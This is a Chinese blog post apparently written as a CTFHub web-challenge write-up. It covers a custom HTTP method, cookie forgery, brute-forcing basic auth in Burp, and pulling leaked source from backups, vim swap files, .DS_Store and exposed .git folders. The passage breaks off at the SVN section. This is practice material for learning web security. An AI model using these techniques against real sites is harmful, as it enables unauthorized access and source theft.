src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTFHub%E7%B3%BB%E5%88%97/">CTFHub系列</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-12-12T12:32:20.972Z">2023-12-12</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-03-03T07:43:46.959Z">2024-03-03</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>CTFHub系列</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x00-web">0x00 Web</h1>
<h2 id="web前置技能">Web前置技能</h2>
<h3 id="http协议-请求方式">HTTP协议-请求方式</h3>
<p>题目描述：HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212203559503.png" alt="image-20231212203559503"></p>
<p>提示:如果你得到“HTTP方法不允许”错误，你应该请求index.php。</p>
<p>这里不知道请求的含义，还是看了wp才明白的。。。先说结果，这里说是http请求方法是可以自定义的，那题目让我们使用CTFHUB方法来请求index.php页面，这里我先用bp抓包修改了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212204347958.png" alt="image-20231212204347958"></p>
<p>如图拿到flag，不过wp是通过curl的方法来请求的</p>
<pre><code class="hljs http">curl -v -X CTFHUB http://challenge-c76d77da5e3e2f67.sandbox.ctfhub.com:10800/index.php</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212204458732.png" alt="image-20231212204458732"></p>
<h3 id="http协议-302跳转">HTTP协议-302跳转</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212211241224.png" alt="image-20231212211241224"></p>
<p>一个超链接，点击一下看源代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212211253414.png" alt="image-20231212211253414"></p>
<p>发现是要跳转到index.php页面的，但我们实际上是跳转到了index.html，这里就是被重定向了，bp截一手</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212211347849.png" alt="image-20231212211347849"></p>
<p>成功拿到，当然这里依旧可以用curl命令来访问index.php</p>
<h3 id="http协议-cookie">HTTP协议-Cookie</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212211505277.png" alt="image-20231212211505277"></p>
<p>这里说只有admin用户能拿到flag，我们需要伪造cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212211604661.png" alt="image-20231212211604661"></p>
<p>bp抓包发现admin=0，直觉改为1即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212211631030.png" alt="image-20231212211631030"></p>
<p>拿到flag</p>
<h3 id="http协议-基础认证">HTTP协议-基础认证</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212212837452.png" alt="image-20231212212837452"></p>
<p>这里我们点击之后需要输入账户密码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212212854575.png" alt="image-20231212212854575"></p>
<p>如上图输入之后bp抓包看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212212916214.png" alt="image-20231212212916214"></p>
<p>这意味着我们需要爆破了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212213011544.png" alt="image-20231212213011544"></p>
<p>这里还提示我们你知道admin吗，那说明用户名大概率就是admin了</p>
<p>发送到bp的爆破模块开始爆破</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212213743959.png" alt="image-20231212213743959"></p>
<ol>
<li><code>Payload Processing</code> -&gt; <code>Add</code>-&gt; <code>Add Prefix</code>（添加前缀）-&gt; 输入 <code>admin:</code></li>
<li><code>Payload Processing</code> -&gt; <code>Add</code>-&gt; <code>Encode</code>（添加一个编码方式）-&gt; 选择 Base64 Encode</li>
</ol>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212213405884.png" alt="image-20231212213405884"></p>
<p><code>Payload Encode</code> 取消勾选 <code>URL-encode</code>, 不然你会看到 base64 之后的 <code>=</code> 会被转成 <code>%3d</code> ，你就算爆破到天荒地老也不会出来</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212213556193.png" alt="image-20231212213556193"></p>
<p>找到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212213606302.png" alt="image-20231212213606302"></p>
<p>这里了解一下HTTP基础认证：</p>
<pre><code class="hljs plaintext">在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212213834114.png" alt="image-20231212213834114"></p>
<h3 id="http-响应包源代码">HTTP-响应包源代码</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212214205734.png" alt="image-20231212214205734"></p>
<p>直接右键源代码查看得到</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212214216206.png" alt="image-20231212214216206"></p>
<h2 id="信息泄露">信息泄露</h2>
<h3 id="目录遍历">目录遍历</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212214932810.png" alt="image-20231212214932810"></p>
<p>根据题目提示直接点击目录找即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212214947406.png" alt="image-20231212214947406"></p>
<h3 id="phpinfo">PHPINFO</h3>
<pre><code class="hljs plaintext">phpinfo() 是php中查看相关信息的函数，当在页面中执行phpinfo()函数时，php会将自身的所有信息全部打印出来。在phpinfo中会泄露很多服务端的一些信息：
例如安装的一些模块、网站绝对路径、服务器自身的操作系统、使用的组件版本等等，在phpinfo中获得的这些信息会为下一步的渗透/做题提供一些帮助</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212215021863.png" alt="image-20231212215021863"></p>
<p>点击查看phpinfo，全局搜索flag，在环境变量中找到lfag</p>
<h3 id="备份文件下载">备份文件下载</h3>
<h4 id="网站源码">网站源码</h4>
<p>题目描述：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212215213639.png" alt="image-20231212215213639"></p>
<p>访问www.zip得到了一个压缩包</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212215549179.png" alt="image-20231212215549179"></p>
<p>根据提示让我们估计是让我们访问该文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212215622650.png" alt="image-20231212215622650"></p>
<p>拿到flag</p>
<h4 id="bak文件">bak文件</h4>
<pre><code class="hljs plaintext">有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212215728521.png" alt="image-20231212215728521"></p>
<p>这里是bak文件泄露，直接访问index.php.bak即可</p>
<h4 id="vim缓存">vim缓存</h4>
<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
<ul>
<li>vim 交换文件名</li>
</ul>
<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：第一次产生的交换文件名为 <code>.index.php.swp</code></p>
<p>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
<p>第三次产生的交换文件则为 <code>.index.php.swn</code></p>
<p>根据上述提示我们访问.index.php.swp得到源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212220039409.png" alt="image-20231212220039409"></p>
<h4 id="ds_store">.DS_Store</h4>
<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212220509792.png" alt="image-20231212220509792"></p>
<p>直接访问/.DS_Store访问得到下载文件，不过内容肉眼难辨，需要工具</p>
<p>这里我们用到了 Python-dsstore 这个工具 (<a target="_blank" rel="noopener" href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a>) 来完成 .DS_Store 文件的解析：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212221303875.png" alt="image-20231212221303875"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231212221320761.png" alt="image-20231212221320761"></p>
<p>访问即可</p>
<h3 id="git泄露">Git泄露</h3>
<h4 id="git-log">Git-Log</h4>
<p>题目描述：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题</p>
<p>直接上工具。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218175448914.png" alt="image-20231218175448914"></p>
<p>克隆好源代码之后，git log查看历史记录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218175524781.png" alt="image-20231218175524781"></p>
<p>发现flag，当前所处的版本为 <code>remove flag</code>，flag 在 <code>add flag</code> 这次提交中</p>
<h5 id="解法一">解法一：</h5>
<p>直接与 <code>add flag (95819c)</code> 这次提交进行比对</p>
<pre><code class="hljs plaintext">git diff 3e25d
# 或者
git diff HEAD^</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218175642115.png" alt="image-20231218175642115"></p>
<h5 id="解法二">解法二：</h5>
<p>直接切换到 add flag (3e25d) 这个版本</p>
<pre><code class="hljs plaintext">git reset --hard 3e25d
# 或
git reset --hard HEAD^</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218175815354.png" alt="image-20231218175815354"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218175827853.png" alt="image-20231218175827853"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218180000146.png" alt="image-20231218180000146"></p>
<h4 id="git-stash">Git-Stash</h4>
<p>考点</p>
<ul>
<li>git 泄露 <code>.git/refs/stash</code></li>
<li>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</li>
</ul>
<pre><code class="hljs plaintext">git stash lish   #查看当前stash中的内容
git stash pop  #将当前stash中的内容弹出，并应用到当前分支对应的工作目录上,可以理解为恢复内容。</code></pre>
<p>克隆好源码之后：</p>
<h5 id="解法一">解法一：</h5>
<p>执行 git stash list 发现有 stash</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218200046002.png" alt="image-20231218200046002"></p>
<p>执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218200112144.png" alt="image-20231218200112144"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218200131951.png" alt="image-20231218200131951"></p>
<h5 id="解法二">解法二：</h5>
<p>如果你使用的  GitHack 工具执行完 git stash show 之后没有显示 stash 记录，那么不妨来尝试这个方法</p>
<ol>
<li>查看 <code>.git/refs/stash</code> 找到 <code>stash</code> 对应的 <code>hash</code></li>
</ol>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218200218024.png" alt="image-20231218200218024"></p>
<p>git diff 25bfc 即可看到 flag–但我这里没有显示，可能是环境没了的问题</p>
<h4 id="git-index">Git-Index</h4>
<p>题目中的index并不是我们理解的web网页，而是一个暂存区，默认存储在.git/index。</p>
<p>关于index的具体知识点大家可以阅读一下这个文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/taiyangdao/article/details/52761572">(Git本地库中的索引（Index）及文件状态概述_易生一世的博客-CSDN博客</a></p>
<pre><code class="hljs plaintext">git checkout-index命令
将Index中列表的文件检出到工作目录，默认不覆盖已有文件。

    -u, --index，更新所有检出的文件的stat信息（git status）
    -a, --all，检出Index中列表的所有文件
    -f, --force，检出时覆盖已有文件
    -n, --no-create，只再次检出工作目录中已有的文件（不创建任何新文件）
    --，禁用任何参数</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231218201612501.png" alt="image-20231218201612501"></p>
<p>这里我是直接读取index目录，结果看到当前目录下多了个txt文件，直接读取得到flag</p>
<h3 id="svn泄露">SVN泄露</h3>
